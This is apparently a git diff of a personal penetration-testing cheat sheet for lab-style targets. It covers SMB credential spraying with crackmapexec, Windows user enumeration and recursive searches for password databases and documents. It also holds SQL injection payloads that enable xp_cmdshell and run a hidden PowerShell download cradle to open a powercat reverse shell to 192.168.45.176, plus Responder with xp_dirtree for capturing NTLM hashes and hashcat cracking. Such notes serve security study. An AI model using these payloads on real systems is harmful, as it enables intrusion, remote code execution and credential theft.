@@ -12,6 +12,15 @@ platform:platform
 foundusername:foundusername
 ```
 
+# Enum tips
+- xyz htb
+- xyz hack the box
+- xyz poc
+- xyz exploit
+- xyz version x.x vulnerabilities
+- xyz github
+
+
 # With Correct Credentials
 - crackmpaexec smb all_ips --users
     - with newly found users, try found passwords on crackmapexec smb with just one machine
@@ -53,8 +62,7 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 # Users and groups
 > whoami /priv
 > whoami /groups
-> net user | Get-LocalGroup
-> net user /domain
+> net user
 > net user admin
 > net localgroup | Get-LocalGroup
 > net localgroup Administrators | Get-LocalGroupMember Administrators
@@ -112,7 +120,7 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 > Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig -File -Recurse -ErrorAction SilentlyContinue
-> Check every user's directory && desktop && documents
+> Check every user's directory && desktop && documents && downloads
 ```
 
 ## Add user
@@ -472,6 +480,11 @@ kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
 ';EXEC sp_configure "xp_cmdshell", 1;--
 ';RECONFIGURE;--
 ';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
+
+
+or
+sudo Responder -I tun0 -A
+xp_dirtree \\192.168.45.176\share
 ```
 
 ## postgresql
